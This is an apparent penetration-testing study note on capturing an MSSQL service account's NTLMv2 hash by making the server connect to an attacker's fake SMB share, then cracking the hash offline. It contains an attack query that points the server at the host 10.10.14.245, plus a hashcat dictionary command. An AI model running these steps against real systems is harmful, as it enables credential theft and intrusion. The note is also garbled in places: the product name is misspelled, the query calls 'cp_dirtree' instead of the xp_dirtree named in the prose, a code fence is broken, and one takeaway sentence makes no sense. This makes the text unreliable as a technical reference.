# Attacking MSSLQ - Hash Capture & Cracking

## Overview
This note covers the process of capturing an NTLM hash from an MSSLQ (Microsoft SQL Server) instance using the `xp_dirtree` administrative procedure, then cracking the hash using offline attacks (Dictionary / Brute-force).

## Principle: NTLM Authentication and SMB

- SMB (Server Message Block) is a protocol used for file sharing over a network.
- When a client (e.g., a SQL Server instance) tries to access an SMB resource, it uses the NTLM protocol for authentication.
- NTLM involves a "challenge" (random number) sent from the server to the client. The client encrypts this challenge using the USER'S NTLM HASH and sends the result back.

## The Attack: Forcing SQL Server to Send its Hash

The attack exploits the `xp_dirtree` stored procedure in MSSQL, which is used to list directories.

1. The attacker sets up a fake SMB server (e.g., using `impacket-smbserver`).

2. The attacker then executes the following query in the MSSQL database:
   ``sql
   EXEC master..cp_dirtree '\\10.10.14.245\share'
   ```

3. The SQL Server instance attempts to connect to the fake SMB server to enumerate the directory.

4. As part of the SMB handshake, the Windows operating system on the SQL server automatically sends the NTLMv2 HASH of the SQL service account (commonly `mssqlsvc`) to the attacker.

## The Hash Brute-force Process

Once the hash is captured, it can be cracked using offline tools (e.g., Hashcat or John the Ripper).

1. Save the hash to a file (e.g., `hash.txt`).

2. Use a dictionary attack (e.g., `rockyou.txt`):
   ```bash
   hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
   ```

3. The tool will try each password in the dictionary, calculating its NTLMv2 hash and comparing it to the captured one.

---

## Key Takeaways:

- The MS SQL Server has to authenticate when it accesses a network resource. This is a core operating system function that the `xp_dirtree` is triggered.
- The captured hash is not the password itself, but a cryptographic representation that can be cracked offline.
- This is a powerful technique because it does not require any privilege escalation on the SQL server; it only requires the ability to execute `xp_dirtree`.
